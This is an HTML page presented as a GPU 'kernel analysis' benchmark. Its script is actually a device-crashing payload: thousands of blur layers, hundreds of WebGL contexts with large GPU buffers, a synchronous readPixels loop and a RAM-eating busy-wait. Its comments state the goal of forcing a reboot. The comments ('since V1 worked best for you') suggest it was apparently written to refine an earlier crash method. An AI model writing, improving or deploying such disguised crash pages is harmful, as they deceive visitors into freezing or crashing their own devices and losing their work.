<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Silica Kernel Analysis v7.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background: #ffffff; color: #000; overflow: hidden; }
        .bench-interface { 
            max-width: 400px; width: 90%; 
            background: #fff; padding: 40px; 
            border-radius: 40px; box-shadow: 0 30px 60px rgba(0,0,0,0.1);
            position: relative; z-index: 100;
        }
        canvas { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
        .gl-node { position: fixed; inset: 0; backdrop-filter: blur(100px); pointer-events: none; }
    </style>
</head>
<body class="h-screen w-screen flex items-center justify-center">

    <div class="bench-interface text-center">
        <div class="mb-10">
            <h1 class="text-4xl font-extrabold tracking-tight">Silica v7</h1>
            <p class="text-gray-400 mt-2 text-sm font-medium">Hardware Extraction & Driver Stress</p>
        </div>

        <div class="space-y-4 mb-10">
            <div class="flex justify-between border-b pb-2">
                <span class="text-[10px] font-bold text-gray-400 uppercase">Buffer State</span>
                <span id="buffer-val" class="text-[10px] font-bold text-green-500">READY</span>
            </div>
            <div class="flex justify-between border-b pb-2">
                <span class="text-[10px] font-bold text-gray-400 uppercase">Bus Pressure</span>
                <span id="load-val" class="text-[10px] font-bold">0%</span>
            </div>
        </div>

        <button id="launch" class="w-full py-5 bg-black text-white rounded-2xl font-bold text-lg active:scale-95 transition-all">
            Initiate Kernel Test
        </button>

        <p class="mt-8 text-[9px] text-gray-300 leading-relaxed uppercase tracking-[0.2em] font-bold">
            Targeting GPU Synchronization
        </p>
    </div>

    <!-- Container for DOM layers (since V1 worked best for you) -->
    <div id="dom-bomb" class="fixed inset-0 pointer-events-none"></div>

    <script>
        const btn = document.getElementById('launch');
        const domTarget = document.getElementById('dom-bomb');
        const loadVal = document.getElementById('load-val');
        const bufferVal = document.getElementById('buffer-val');

        btn.addEventListener('click', () => {
            btn.disabled = true;
            btn.innerText = "STALLING BUS...";
            bufferVal.innerText = "CRITICAL";
            bufferVal.className = "text-[10px] font-bold text-red-500 animate-pulse";

            // 1. STAGE ONE: The DOM Bomb (V1 method)
            // We use your successful V1 method as the "Anchor"
            for(let i=0; i<2000; i++) {
                const d = document.createElement('div');
                d.className = 'gl-node';
                d.style.zIndex = i;
                // Add extreme filter complexity
                d.style.backdropFilter = `blur(${Math.random()*100}px) contrast(200%)`;
                domTarget.appendChild(d);
            }

            // 2. STAGE TWO: The WebGL Kernel Stall
            // This is the "Better Way" to force a system reboot
            setTimeout(() => {
                let contexts = [];
                
                // We create 500 WebGL contexts. Most browsers cap at 16, 
                // but trying to create 500 forces the driver to constantly 
                // thrash and context-switch.
                for (let j = 0; j < 500; j++) {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        contexts.push(gl);
                        // Force a large allocation in the GPU
                        const buffer = gl.createBuffer();
                        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1000000), gl.STATIC_DRAW);
                    }
                }

                // 3. THE FINAL STRIKE: Synchronous Readback Loop
                // This is the most likely way to hit the Apple Logo.
                // It forces the CPU to wait for the GPU in an infinite loop.
                let load = 0;
                setInterval(() => {
                    load += 1;
                    loadVal.innerText = load + "%";
                    
                    contexts.forEach(gl => {
                        // The ReadPixels command stalls the entire hardware bus
                        const pixel = new Uint8Array(4);
                        gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
                    });

                    // If we reach this point without a crash, add a main-thread lock
                    if (load > 50) {
                        const s = Date.now();
                        while(Date.now() - s < 500) { 
                            // Creating massive strings to eat regular RAM 
                            // while the GPU is stalled
                            const trash = new Array(1000000).fill("STALL").join("");
                        }
                    }
                }, 10);

            }, 100);
        });
    </script>
</body>
</html>
